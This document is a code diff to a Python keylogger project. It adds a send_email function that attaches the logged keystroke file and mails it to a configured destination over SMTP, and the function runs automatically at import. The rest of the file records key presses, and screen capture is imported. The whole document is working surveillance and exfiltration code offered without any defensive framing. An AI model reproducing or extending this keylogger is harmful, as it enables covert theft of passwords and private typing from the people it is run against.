@@ -34,14 +34,57 @@ import getpass
 from requests import get
 from PIL import ImageGrab
 
-# Name of the keys file
-keys_information = 'key_log.txt'
+# Import confiparser
+from configparser import ConfigParser
+from keylogger.config import Config
 
-file_path = 'C:\\Users\\tayja\Documents\\projects\\inSPy-Logger'
-extend = '\\'
+config = Config()
+config = config.load()
 
 count = 0
 keys = []  # Empty list to append keys to
+
+
+def send_email(filename, attachment, toaddr):
+    global config
+    fromaddr = config.get('SENDMAIL.PARTIES', 'from')
+    from_usr = config.get('SENDMAIL.AUTH', 'login')
+    usr_passwd = config.get('SENDMAIL.AUTH', 'password')
+    host = config.get('SENDMAIL.SERVER', 'host')
+    port = config.getint('SENDMAIL.SERVER', 'port')
+
+    # Prepare our message
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = 'Key Log File'
+
+    body = 'Body_of_the_mail'
+
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', f'attachment: filename={filename}')
+    msg.attach(p)
+
+    # Establish a connection with the SMTP server
+    sesh = smtplib.SMTP(host, port)
+    sesh.starttls()
+    sesh.login(from_usr, usr_passwd)
+
+    text = msg.as_string()
+    sesh.sendmail(fromaddr, toaddr, text)
+
+    sesh.quit()
+
+
+send_email('keys.txt', config.get('FILES', 'key-store'), config.get('SENDMAIL.PARTIES', 'dest'))
 
 
 def on_press(key):
@@ -58,7 +101,7 @@ def on_press(key):
 
 
 def write_file(keys):
-    with open(file_path + extend + keys_information, 'a') as f:
+    with open(config.get('FILES', 'key-store'), 'a') as f:
         for key in keys:
             k = str(key).replace("'", '')
             if k.find('space') > 0:
@@ -68,7 +111,6 @@ def write_file(keys):
             elif k.find('Key') == -1:
                 f.write(k)
                 f.close()
-
 
 
 def on_release(key):
